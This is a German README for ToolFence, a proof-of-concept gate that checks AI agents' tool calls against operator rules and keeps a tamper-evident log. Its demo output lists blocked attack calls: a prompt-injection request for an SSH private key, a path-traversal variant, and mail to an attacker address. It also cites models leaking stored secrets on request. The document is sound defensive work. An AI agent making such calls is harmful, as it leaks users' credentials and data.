# ToolFence

**Werkzeugaufrufe von KI-Agenten gegen selbstgeschriebene Regeln prüfen, bevor sie
ausgeführt werden — mit fälschungssicherem Protokoll.**

Ein Sprachmodell unterscheidet nicht zwischen der Anweisung seines Betreibers und dem
Text, den es gerade liest. Solange nur Sätze herauskommen, ist das ein Ärgernis. Sobald
Werkzeuge dranhängen — Dateien, Mails, Datenbanken —, ist es ein Schaden.

ToolFence setzt sich zwischen Agent und Werkzeug. Die Entscheidung, ob ein Aufruf
durchgeht, trifft eine Regel des Betreibers, nicht das Modell.

Dieses Repository ist der **Prinzipbeweis** zur Bewerbung beim Prototype Fund,
Jahrgang 03 (Förderlinie Innovation, Schwerpunkt Datensicherheit). Lizenz: Apache-2.0.

## Was hier bewiesen wird

| Behauptung | Wo sie geprüft wird |
|---|---|
| Die Schranke entscheidet **vor** der Ausführung — ein abgelehnter Aufruf erreicht das Werkzeug nie | `selftest` Prüfung 1 |
| Erlaubnisliste, keine Verbotsliste: ein nicht geregeltes Werkzeug ist verboten | Prüfung 5 |
| Pfadtraversale wird als solche erkannt und benannt, nicht nur als falsches Prefix | Prüfung 2 |
| Unwiderrufliche Werkzeuge brauchen eine Bestätigung | Prüfung 3 |
| Argumentschema: ein Empfänger außerhalb des Musters wird abgelehnt | Prüfung 4 |
| Die Häufigkeitsgrenze greift | Prüfung 6 |
| Eine nachträgliche **Änderung** bricht die Hash-Kette nachweisbar | Prüfung 7 |
| Ein **entfernter** Eintrag bricht sie ebenso (Append-Only) | Prüfung 8 |
| Der SARIF-Bericht enthält genau die Ablehnungen | Prüfung 9 |

## Ausführen

```
python toolfence.py            # Demonstration
python toolfence.py --selftest # alle Prüfungen (Ausgabe: "selftest: ok")
```

Keine Abhängigkeiten außer der Standardbibliothek.

## Gemessene Ausgabe

```
ToolFence — Prinzipbeweis
============================================================

DURCH  Erlaubt: Projektdatei lesen
        datei_lesen({'pfad': '/projekt/notizen.md'})
        -> Regel erfüllt
        Ergebnis: 'Terminliste'

STOPP  Angriff: fremder Text verlangt den SSH-Schlüssel
        datei_lesen({'pfad': '/home/.ssh/id_ed25519'})
        -> Pfad liegt nicht unter /projekt/

STOPP  Angriff: Pfadtraversale
        datei_lesen({'pfad': '/projekt/../home/.ssh/id_ed25519'})
        -> Pfadtraversale (..) im Argument pfad

STOPP  Abgelehnt: Mail nach außen
        mail_senden({'an': 'angreifer@example.com', 'text': 'Daten'})
        -> Argument an entspricht nicht '[^@]+@behoerde\.de'

DURCH  Erlaubt mit Bestätigung: Mail an die Behörde
        mail_senden({'an': 'amt@behoerde.de', 'text': 'Bericht'})
        -> Regel erfüllt
        Ergebnis: 'gesendet an amt@behoerde.de (7 Zeichen)'

STOPP  Abgelehnt: Mail ohne Bestätigung
        mail_senden({'an': 'amt@behoerde.de', 'text': 'Bericht'})
        -> unwiderruflich — Bestätigung fehlt

============================================================
Protokoll: 6 Einträge, Kette ungebrochen
Nach Manipulation eines Eintrags: erkannt — Eintrag 2: Inhalt wurde nachträglich geändert
SARIF-Bericht: 3 Ablehnungen
```

## Was dieser Prinzipbeweis *nicht* ist

Ehrlichkeit über die Grenzen gehört zur Sache, weil die Schranke sonst Sicherheit
behauptet, die sie nicht hat:

* **Die Hash-Kette liegt hier im Speicher.** Sie beweist, dass ein Protokoll nicht
  unbemerkt geändert wurde, nicht dass es nicht als Ganzes ersetzt wurde. Dafür braucht
  es einen externen Anker (Zeitstempel oder ein zweites Protokoll) — Arbeit des Vorhabens,
  nicht des Prinzipbeweises.
* **Die Regeln sind so gut wie der, der sie schreibt.** ToolFence erzwingt keine guten
  Regeln; es macht die geschriebenen überprüfbar und ihre Verletzung sichtbar.
* **Geprüft wird der Aufruf, nicht die Absicht.** Ein Aufruf, den die Regel erlaubt und
  der schädlich ist, geht durch. Die Antwort darauf ist eine engere Regel, kein Modell,
  das raten soll.
* **Vermittelt wird hier lokal und in-process.** Die echten Protokolle — Model Context
  Protocol, OpenAI-Tool-Schema, LangChain — sind Meilenstein 1 und 5 des Vorhabens.

## Umfeld

* **Xenguard** (Prototype Fund, Jahrgang 02, aktuell gefördert, AGPL-3.0) prüft
  Software-*Abhängigkeiten* gegen selbstgeschriebene Regeln und lässt nur Konformes durch.
  ToolFence ist dieselbe Bauform eine Schicht höher: nicht das Paket, das hereinkommt,
  sondern der Aufruf, der hinausgeht. Gemeinsamer Anknüpfungspunkt ist der SARIF-Bericht.
* **LLMSecTest** (Prototype Fund, Jahrgang 02) liefert die Messung, auf der ToolFence
  aufsetzt: 52 geprüfte Sprachmodelle, 32 davon gaben ein hinterlegtes Geheimnis heraus,
  weil der Eingabetext danach fragte.
* **Portable Firewall für QubesOS** (Runde 5) ist der Präzedenzfall für eine Schranke als
  gefördertem Softwarebaustein — bis in die Aufnahme ins Contributions-Repository.
